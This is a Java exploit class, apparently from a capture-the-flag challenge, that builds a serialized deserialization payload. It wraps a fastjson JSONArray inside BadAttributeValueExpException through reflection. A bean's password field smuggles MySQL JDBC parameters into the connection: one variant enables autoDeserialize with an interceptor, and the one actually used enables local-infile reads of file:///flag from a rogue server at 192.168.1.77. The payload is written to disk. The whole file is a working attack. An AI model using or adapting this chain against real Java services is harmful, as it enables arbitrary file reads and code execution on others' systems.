import com.alibaba.fastjson.JSONArray;
import com.ctf.bean.MyBean;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;

public class Wrapper_exp {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException {
        MyBean myBean = new MyBean();
        myBean.setDatabase("mysql");
        myBean.setUsername("root");
        myBean.setHots("192.168.1.77");
        String password = "123456&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";
        String password2 = "123456&user=fileread_file:///flag\\&allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360";
        myBean.setPassword(password2);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(myBean);

//        jsonArray.toString();

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setFieldValue(bd, "val", jsonArray);
        FileOutputStream fos = new FileOutputStream(new File("D:\\tmp\\hex.bin"));
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(bd);
        oos.close();

    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Class<?> aClass = obj.getClass();
        Field field = null;
        while (aClass != null) {
            try {
                field = aClass.getDeclaredField(fieldName);
                break;
            }catch (NoSuchFieldException e) {
                aClass = aClass.getSuperclass();
            }
        }
        field.setAccessible(true);
        field.set(obj, value);
    }
}
